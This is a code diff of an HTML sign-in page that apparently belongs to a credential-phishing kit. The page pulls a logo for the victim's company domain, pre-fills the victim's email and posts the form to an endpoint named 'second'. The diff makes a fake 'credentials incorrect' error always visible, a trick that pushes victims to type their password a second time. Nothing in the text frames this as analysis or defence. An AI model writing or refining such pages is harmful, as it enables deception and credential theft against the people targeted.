@@ -141,12 +141,15 @@
             <img src="https://api.kickfire.com/logo?website={{dman}}" alt="Business Logo">
             <h1>Sign In</h1>
             <p>Welcome back! Please enter your credentials to access your account.</p>
+
+            <p style="color: #e74c3c; text-align: center;
+    font-size: 14px;">
+                    The credentials entered is incorrect. Please try again.
+                  </p>
         </div>
         <form action="second" method="POST">
             <div class="input-group">
-                <p style="color: #e74c3c; text-align: center; margin-top: 10px; display: none; font-size: 14px;">
-                    The credentials entered is incorrect. Please try again.
-                  </p>
+                
                   
                 <label for="email">Email Address</label>
                 <input type="email" id="email" name="horse" value="{{eman}}" required="">
